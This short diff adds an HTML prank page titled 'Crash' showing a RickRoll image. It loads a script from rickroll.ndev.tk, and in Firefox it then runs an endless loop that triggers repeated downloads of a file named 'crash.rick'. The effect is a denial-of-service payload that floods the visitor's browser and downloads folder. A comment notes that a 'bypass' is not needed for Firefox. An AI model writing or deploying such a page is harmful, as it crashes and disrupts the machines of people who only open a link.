@@ -1,0 +1,24 @@
+<html>
+<head>
+<title>Crash</title>
+</head>
+<body>
+<b><h1>RickRoll :D</h1></b>
+<script src="https://rickroll.ndev.tk/utils.js"></script>
+<img src="https://rickroll.ndev.tk/rick.png" alt="RickRoll Error">
+</body>
+<script>
+async function DoTheThingPlease() {
+    while(true) {
+        for (var i = 0; i < 1000; i++) {
+            await download("data:text/html,RickRoll :D", "crash.rick");
+        }
+    }
+}
+if (navigator.userAgent.includes("Firefox")) { // Bypass not needed for Firefox
+    DoTheThingPlease();
+} else {
+    alert("Firefox only!!!")
+}
+</script>
+</html>
